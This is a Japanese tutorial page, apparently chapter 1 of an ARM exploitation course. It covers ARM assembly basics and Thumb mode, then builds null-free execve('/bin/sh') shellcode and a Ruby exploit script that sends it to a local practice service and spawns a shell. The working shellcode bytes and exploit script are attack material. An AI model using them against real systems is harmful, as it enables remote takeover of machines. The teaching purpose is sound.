<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>1. Crafting Shellcode 🐚</title>
    <meta name="description" content="">
    
    
    <link rel="preload" href="/ARM_Exploit/assets/css/0.styles.e466e900.css" as="style"><link rel="preload" href="/ARM_Exploit/assets/js/app.c064dbfe.js" as="script"><link rel="preload" href="/ARM_Exploit/assets/js/2.2d619ac4.js" as="script"><link rel="preload" href="/ARM_Exploit/assets/js/8.746eb6c5.js" as="script"><link rel="prefetch" href="/ARM_Exploit/assets/js/10.27ea7a0c.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/3.96930671.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/4.edb5607f.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/5.d057307c.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/6.f5bf7ae1.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/7.0ad3fa28.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/9.66bb3eef.js">
    <link rel="stylesheet" href="/ARM_Exploit/assets/css/0.styles.e466e900.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/ARM_Exploit/" class="home-link router-link-active"></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/ARM_Exploit/" class="nav-link">Home</a></div><div class="nav-item"><a href="https://twitter.com/encry1024" target="_blank" rel="noopener noreferrer" class="nav-link external">
  About me
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><a href="https://github.com/owlinux1000/ARM_Exploit" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Repository
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/ARM_Exploit/" class="nav-link">Home</a></div><div class="nav-item"><a href="https://twitter.com/encry1024" target="_blank" rel="noopener noreferrer" class="nav-link external">
  About me
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><a href="https://github.com/owlinux1000/ARM_Exploit" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Repository
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/ARM_Exploit/" class="sidebar-link">Home</a></li><li><a href="/ARM_Exploit/chapter01/" class="active sidebar-link">1. Crafting Shellcode</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/ARM_Exploit/chapter01/#_1-1-arm-アセンブリ基礎" class="sidebar-link">1.1 ARM アセンブリ基礎</a></li><li class="sidebar-sub-header"><a href="/ARM_Exploit/chapter01/#_1-2-シェルコード作成" class="sidebar-link">1.2 シェルコード作成</a></li><li class="sidebar-sub-header"><a href="/ARM_Exploit/chapter01/#_1-3-シェルコードを用いたシェル奪取" class="sidebar-link">1.3 シェルコードを用いたシェル奪取</a></li><li class="sidebar-sub-header"><a href="/ARM_Exploit/chapter01/#_1-4-まとめ" class="sidebar-link">1.4 まとめ</a></li></ul></li><li><a href="/ARM_Exploit/chapter02/" class="sidebar-link">2. Buffer Overflow</a></li><li><a href="/ARM_Exploit/chapter03/" class="sidebar-link">3. Return to libc</a></li><li><a href="/ARM_Exploit/chapter04/" class="sidebar-link">4. Playing with Canary</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="_1-crafting-shellcode"><a href="#_1-crafting-shellcode" aria-hidden="true" class="header-anchor">#</a> 1. Crafting Shellcode 🐚</h1> <p>第1章では、Exploitには欠かせないシェルコード作成を通して、ARM アセンブリの基本的な構文や仕組みについて簡単にご説明をします。最後に、実際に作成したシェルコードを用いて、演習問題でシェルを奪取する練習をします。</p> <h2 id="_1-1-arm-アセンブリ基礎"><a href="#_1-1-arm-アセンブリ基礎" aria-hidden="true" class="header-anchor">#</a> 1.1 ARM アセンブリ基礎</h2> <p>ARM アーキテクチャは、RISC（Reduced Instruction Set Computing)）で、ロード/ストアなアーキテクチャです。メモリへのアクセスはレジスタを介したロード、ストア命令のみです。ARM の主要なレジスタには、r0 ~ r15レジスタとcpsrレジスタなどがあります。特にr11 ~ r15ジレスタは特殊な用途に使われるため別名が付けられています。以下にレジスタの概要をまとめます。</p> <table><thead><tr><th style="text-align:center;">レジスタ</th> <th style="text-align:left;">概要</th></tr></thead> <tbody><tr><td style="text-align:center;">r0</td> <td style="text-align:left;">関数の戻り値の保存、関数の第1引数に利用</td></tr> <tr><td style="text-align:center;">r1</td> <td style="text-align:left;">関数の第2引数に利用</td></tr> <tr><td style="text-align:center;">r2</td> <td style="text-align:left;">関数の第3引数に利用</td></tr> <tr><td style="text-align:center;">r3</td> <td style="text-align:left;">関数の第4引数に利用</td></tr> <tr><td style="text-align:center;">r4 ~ r8</td> <td style="text-align:left;">汎用的に利用</td></tr> <tr><td style="text-align:center;">r8</td> <td style="text-align:left;">汎用的に利用</td></tr> <tr><td style="text-align:center;">r9</td> <td style="text-align:left;">汎用的に利用</td></tr> <tr><td style="text-align:center;">r10</td> <td style="text-align:left;">汎用的に利用</td></tr> <tr><td style="text-align:center;">r11</td> <td style="text-align:left;">フレームポインタ（別名fp）</td></tr> <tr><td style="text-align:center;">r12</td> <td style="text-align:left;">インストラクションポインタ（別名ip）</td></tr> <tr><td style="text-align:center;">r13</td> <td style="text-align:left;">スタックポインタ（別名sp）</td></tr> <tr><td style="text-align:center;">r14</td> <td style="text-align:left;">リンクレジスタ（別名lr）</td></tr> <tr><td style="text-align:center;">r15</td> <td style="text-align:left;">プログラムカウンタ（別名pc）</td></tr> <tr><td style="text-align:center;">cpsr</td> <td style="text-align:left;">カレントプログラムモードレジスタ</td></tr></tbody></table> <p>cpsrレジスタはx86のeflagsレジスタのようなものでフラグ管理をしています。特に下位5bit目のフラグは重要な値になっており、ARMモードとThumbモードと呼ばれる2つのモードの状態を示す役割を持っています。ARMモードが基本的なモードです。Thumbモードについては後述します。</p> <p>ARM アセンブリにはとても多くの命令があります。よく使われる代表的な命令を以下に示します。</p> <table><thead><tr><th style="text-align:left;">命令</th> <th style="text-align:left;">動作</th> <th style="text-align:left;">命令</th> <th style="text-align:left;">動作</th></tr></thead> <tbody><tr><td style="text-align:left;">MOV</td> <td style="text-align:left;">値をコピーする</td> <td style="text-align:left;">PUSH</td> <td style="text-align:left;">スタックに値をpushする</td></tr> <tr><td style="text-align:left;">MVN</td> <td style="text-align:left;">値の2の補数をコピーする</td> <td style="text-align:left;">POP</td> <td style="text-align:left;">スタックから値をpopする</td></tr> <tr><td style="text-align:left;">ADD/SUB</td> <td style="text-align:left;">加算/減算を行う</td> <td style="text-align:left;">LDR</td> <td style="text-align:left;">メモリから値をロードする</td></tr> <tr><td style="text-align:left;">AND/OR/EOR</td> <td style="text-align:left;">論理積/論理和/排他的論理和を行う</td> <td style="text-align:left;">STR</td> <td style="text-align:left;">メモリに値をストアする</td></tr> <tr><td style="text-align:left;">LSL/LSR</td> <td style="text-align:left;">論理左/右シフトを行う</td> <td style="text-align:left;">B</td> <td style="text-align:left;">制御を無条件に移す</td></tr> <tr><td style="text-align:left;">ASR</td> <td style="text-align:left;">算術右シフトを行う</td> <td style="text-align:left;">BL</td> <td style="text-align:left;">次の命令のアドレスをlrレジスタに格納し、制御を移す</td></tr> <tr><td style="text-align:left;">CMP</td> <td style="text-align:left;">値を比較し、csprレジスタの値を更新する</td> <td style="text-align:left;">BX</td> <td style="text-align:left;">制御を無条件に移す。飛び先のアドレスの末尾1bitによりモードを変更する</td></tr></tbody></table> <p>実際にARMアセンブリでプログラムを作成してみましょう。<code>Hello</code> を出力するプログラム<code>hello.asm</code> を作成します。様々な命令を紹介するために少し冗長に構築しています。ご存知の通り命令の種類はとても多いので、一部のみ取り扱います。</p> <div class="language- extra-class"><pre class="language-text"><code>.text
.global _start
_start:
        eor r0, r0     @ r0 = 0
        add r0, #1     @ r0 += 1
        adr r1, s      @ r1 = &amp;s
        mov r2, #6     @ r2 = 6
        mov r7, #4     @ r7 = 4
        svc 0          @ write(1, &amp;s, 6)
        eor r0, r0     @ r0 = 0
        add r7, r0, #1 @ r7 = 1
        svc 0          @ exit(0)
s:
  .asciz &quot;Hello\n&quot;
</code></pre></div><p>各行の命令について補足していきます。eor 命令は、xorを行う命令です。引数に同じr0 レジスタを取っているため0初期化していることがわかります。add 命令は、加算を行う命令です。2番目のオペランドは、即値を表しています。したがって本命令は、r0にr0+1を代入する命令になっています。adr 命令は、ラベルのアドレスを第1オペランドに代入する用途で使っています。mov 命令は、値を代入する命令です。svc 命令は、システムコールを発行する命令です。システムコールを直接呼ぶ場合は、r7レジスタにシステムコール番号、r0 ~ r6レジスタに引数をセットして、svc 命令を実行します。また、戻り値はr0レジスタにセットされます。また、svc 命令のオペランドは基本的に無視されます。ここでは、r7 レジスタに4が入っているためwrite システムコールを発行し、<code>Hello\n</code> を出力します。その後の3命令はもう読み解けるでしょう。システムコール番号を調べる際には、<code>ausyscall</code> コマンドが便利です。以下のようにシステムコール名を与えることで、システムコール番号を表示してくれます。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ ausyscall <span class="token function">write</span>
<span class="token function">write</span>              <span class="token number">4</span>
writev             <span class="token number">146</span>
pwrite64           <span class="token number">181</span>
pciconfig_write    <span class="token number">273</span>
pwritev            <span class="token number">362</span>
process_vm_writev  <span class="token number">377</span>
pwritev2           <span class="token number">393</span>
</code></pre></div><p>また、本コードから実行ファイルを作成する際には、以下のように<code>as</code> と<code>ld</code> コマンドを用います。実行すると前述した通り文字列を表示して終了します。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ as hello.asm -o hello.o
$ ld hello.o -o hello
$ ./hello
Hello
</code></pre></div><h3 id="thumb-モード"><a href="#thumb-モード" aria-hidden="true" class="header-anchor">#</a> Thumb モード</h3> <p>ARMには、通常のARMモードとThumbモードの2つのモードが存在します。以下に主な違いを示します。</p> <table><thead><tr><th style="text-align:center;">観点</th> <th style="text-align:center;">ARM モード</th> <th style="text-align:center;">Thumb モード</th></tr></thead> <tbody><tr><td style="text-align:center;">命令語の長さ</td> <td style="text-align:center;">4 byte</td> <td style="text-align:center;">2 byte</td></tr> <tr><td style="text-align:center;">扱える汎用レジスタの数</td> <td style="text-align:center;">16個</td> <td style="text-align:center;">8個</td></tr></tbody></table> <p>ARM モードとThumb モードの切り替えには、BX 命令とBLX 命令が利用されます。<code>BX r0</code> のようにレジスタ指定で制御が移る場合は、レジスタの中身が偶数であればARM モード、奇数であればThumb モードに切り替わります。よくある例として、<code>add r3, pc, #1; bx r3</code> を実行すると、r3 レジスタには、pc+1の奇数のアドレスが格納され、そのアドレスに対してジャンプするため、元がARM モードの場合はThumb モードに切り替わります。</p> <div class="tip custom-block"><p>Exploit開発においては、Thumbモードは命令語の長さが短いため、長さ制限などがある場合にはとても便利です。</p></div> <h2 id="_1-2-シェルコード作成"><a href="#_1-2-シェルコード作成" aria-hidden="true" class="header-anchor">#</a> 1.2 シェルコード作成</h2> <p>最も代表的なシェルコードは、<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> を実行することです。これをリモート側のサーバ上で実行することで、リモートサーバのシェルを奪取することができます。ARM では <code>execve</code> システムコールの番号は、11となっています。そのため、r7 レジスタには11を設定する必要があります。引数にはr0レジスタに<code>/bin/sh</code> のアドレス、r1レジスタとr2レジスタには0を設定する必要があります。この状態で、svc 命令を実行することでシェルを起動することができます。以下にシェルコードの例を示します。</p> <div class="language- extra-class"><pre class="language-text"><code>.text
.global _start

_start:
        .code 32
        add r3, pc, #1
        bx r3

        .code 16
        adr r0, s
        mov r7, #11
        eor r1, r1
        eor r2, r2
        strb r2, [r0, #7]
        svc #1
s:      .asciz &quot;/bin/shA&quot;
</code></pre></div><p>ここでは、Thumbモードも用いてバイト数を削る試みもしています。<code>bx r3</code> でジャンプする際に<code>adr r0, s</code> のアドレス+1した値に飛ぼうとしてます（ARMではPCは実行中の命令+8を指す）。これにより<code>adr r0, s</code> からはThumb モードで実行されます。文字列<code>s</code> では、末尾に<code>A</code>が余分についています。本来であればNULL終端をさせたいところですが、Buffer Overflowを招く代表的なstrcpy関数などでは、NULL終端してしまいます。そのため攻撃用のペイロードのコピーが意図しないところで止まる可能性があります。そこで、<code>strb r2, [r0, #7]</code> を使って、文字列<code>s</code> のアドレス+7をしたアドレス（<code>A</code>のアドレス）に対して、r2ジレスタの値をストアしています。r2 レジスタは、1つ前の命令で0初期化しているため、本処理は、<code>A</code> を<code>\x00</code> に置き換える処理になっています。生の値として<code>\x00</code> を埋め込むのではなく、コードの実行中に<code>\x00</code> に置き換えることでNULLが無いシェルコードを実現しています。Exploitに利用する際にはNULLが存在しないシェルコードを利用することが望ましいです。では、実際にアセンブルして実行ファイルを作成し、中身を見てみましょう。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ as shellcode.asm -o shellcode.o
$ ld shellcode.o -o shellcode.bin
$ objdump -d shellcode.bin

shellcode.bin:     <span class="token function">file</span> <span class="token function">format</span> elf32-littlearm


Disassembly of section .text:

00010054 <span class="token operator">&lt;</span>_start<span class="token operator">&gt;</span>:
   <span class="token number">10054</span>:       e28f3001        <span class="token function">add</span>     r3, pc, <span class="token comment">#1</span>
   <span class="token number">10058</span>:       e12fff13        bx      r3
   1005c:       a002            <span class="token function">add</span>     r0, pc, <span class="token comment">#8      ; (adr r0, 10068 &lt;s&gt;)</span>
   1005e:       270b            movs    r7, <span class="token comment">#11</span>
   <span class="token number">10060</span>:       <span class="token number">4049</span>            eors    r1, r1
   <span class="token number">10062</span>:       <span class="token number">4052</span>            eors    r2, r2
   <span class="token number">10064</span>:       71c2            strb    r2, <span class="token punctuation">[</span>r0, <span class="token comment">#7]</span>
   <span class="token number">10066</span>:       df01            svc     <span class="token number">1</span>

00010068 <span class="token operator">&lt;</span>s<span class="token operator">&gt;</span>:
   <span class="token number">10068</span>:       6e69622f        .word   0x6e69622f
   1006c:       4168732f        .word   0x4168732f
   <span class="token number">10070</span>:       00              .byte   0x00
   <span class="token number">10071</span>:       00              .byte   0x00
   <span class="token number">10072</span>:       46c0            nop                     <span class="token punctuation">;</span> <span class="token punctuation">(</span>mov r8, r8<span class="token punctuation">)</span>
</code></pre></div><p>上記の通り、0x1006c までの命令の16進数に<code>00</code>が含まれていないことがわかります。</p> <div class="tip custom-block"><p><code>shellcode.bin</code> は実行できるのですが、正しく実行されずに終了してしまいます。それは、<code>A</code>を<code>\x00</code>で置き換える処理において、書き込み権限がないためです。しかしながら、Exploitに組み込み実行する際は、ほとんどの場合シェルコード自体が存在するメモリの書き込み権限はあるため正常に動作します。</p></div> <h2 id="_1-3-シェルコードを用いたシェル奪取"><a href="#_1-3-シェルコードを用いたシェル奪取" aria-hidden="true" class="header-anchor">#</a> 1.3 シェルコードを用いたシェル奪取</h2> <p>ここでは他の章でも使っていく演習問題を用いた攻撃環境の構築方法についてご紹介します。ここでは、Raspbian側でsocatを用いてバイナリファイルを特定のポートで待ち受けて、そこへ向けて攻撃していきます。以下のようにして実行します。ここでは、<code>shellcode</code>という実行ファイルを8888/tcp で待受させます。このファイルは入力を受け取り、それを実行するプログラムになっています。送ったシェルコードがそのまま実行されてしまうとても危険なプログラムです。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ socat tcp-l:8888,reuseaddr,fork exec:./shellcode
</code></pre></div><p>上記を実行後、ホスト環境から接続すると以下のような応答が帰ってくるはずです。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">nc</span> localhost <span class="token number">8888</span>
Give me a shellcode: 
</code></pre></div><p>これで攻撃環境の構築は終了です。次に、実際のExploit コードを作成していきますが、その前に <a href="#%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89%E4%BD%9C%E6%88%90">1.2 シェルコード作成</a> で作成したシェルコードをスクリプト言語などで扱えるようにします。シェルコードとして抽出する必要があるのは、アセンブリ言語で作成した部分のみなので、以下のようにして取り出します。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ objcopy -O binary shellcode.bin shellcode_hex.bin
$ hexdump -v -e <span class="token string">'&quot;<span class="token entity" title="\\">\\</span>&quot;&quot;x&quot; 1/1 &quot;%02x&quot; &quot;&quot;'</span> shellcode_hex.bin
<span class="token punctuation">\</span>x01<span class="token punctuation">\</span>x30<span class="token punctuation">\</span>x8f<span class="token punctuation">\</span>xe2<span class="token punctuation">\</span>x13<span class="token punctuation">\</span>xff<span class="token punctuation">\</span>x2f<span class="token punctuation">\</span>xe1<span class="token punctuation">\</span>x02<span class="token punctuation">\</span>xa0<span class="token punctuation">\</span>x0b<span class="token punctuation">\</span>x27<span class="token punctuation">\</span>x49<span class="token punctuation">\</span>x40<span class="token punctuation">\</span>x52<span class="token punctuation">\</span>x40<span class="token punctuation">\</span>xc2<span class="token punctuation">\</span>x71<span class="token punctuation">\</span>x01<span class="token punctuation">\</span>xdf<span class="token punctuation">\</span>x2f<span class="token punctuation">\</span>x62<span class="token punctuation">\</span>x69<span class="token punctuation">\</span>x6e<span class="token punctuation">\</span>x2f<span class="token punctuation">\</span>x73<span class="token punctuation">\</span>x68<span class="token punctuation">\</span>x41
</code></pre></div><p>8888/tcp と接続して、このシェルコードを送るExploit コードを以下に示します。</p> <div class="language-ruby extra-class"><pre class="language-ruby"><code><span class="token comment">#!/usr/bin/env ruby</span>
<span class="token comment">#coding: ascii-8bit</span>
<span class="token keyword">require</span> <span class="token string">'pwn'</span>

host <span class="token operator">=</span> <span class="token string">'localhost'</span>
port <span class="token operator">=</span> <span class="token number">8888</span>
z <span class="token operator">=</span> <span class="token constant">Sock</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">host</span><span class="token punctuation">,</span> port
z<span class="token punctuation">.</span>recvuntil <span class="token string">&quot;: &quot;</span>
payload <span class="token operator">=</span> <span class="token string">&quot;\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x0b\x27\x49\x40\x52\x40\xc2\x71\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41&quot;</span>
puts <span class="token string">&quot;[*] shellcode length: <span class="token interpolation"><span class="token delimiter tag">#{</span>payload<span class="token punctuation">.</span>length<span class="token delimiter tag">}</span></span>&quot;</span>
z<span class="token punctuation">.</span>sendline payload
z<span class="token punctuation">.</span>interact
</code></pre></div><p>本コードを実行すると以下のように、Raspbian 内部のシェルを操作できるようになっていることがわかります。また、このシェルコードの長さは、28byteでした。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ ./solve.rb
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> shellcode length: <span class="token number">28</span>
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Switching to interactive mode
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,20<span class="token punctuation">(</span>dialout<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,60<span class="token punctuation">(</span>games<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span>,105<span class="token punctuation">(</span>input<span class="token punctuation">)</span>,109<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,997<span class="token punctuation">(</span>gpio<span class="token punctuation">)</span>,998<span class="token punctuation">(</span>i2c<span class="token punctuation">)</span>,999<span class="token punctuation">(</span>spi<span class="token punctuation">)</span>
</code></pre></div><p>続く章でも同じような手順で、バイナリを待ち受けて、Exploit コードを実行していきます。</p> <h2 id="_1-4-まとめ"><a href="#_1-4-まとめ" aria-hidden="true" class="header-anchor">#</a> 1.4 まとめ</h2> <p>本章では、ARMアセンブリの基本からシェルコードの作成と実行まで幅広く見てきました。ARMアセンブリは、x86と違う点が多く少しむずかしいですが、Exploit をする上ではThumbモードなど重要な要素がとても多く絡んできます。適切に理解することで、他の攻撃手法を正しく理解できるようになると思います。</p></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/ARM_Exploit/" class="prev router-link-active">Home</a></span> <span class="next"><a href="/ARM_Exploit/chapter02/">2. Buffer Overflow</a>→
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/ARM_Exploit/assets/js/app.c064dbfe.js" defer></script><script src="/ARM_Exploit/assets/js/2.2d619ac4.js" defer></script><script src="/ARM_Exploit/assets/js/8.746eb6c5.js" defer></script>
  </body>
</html>
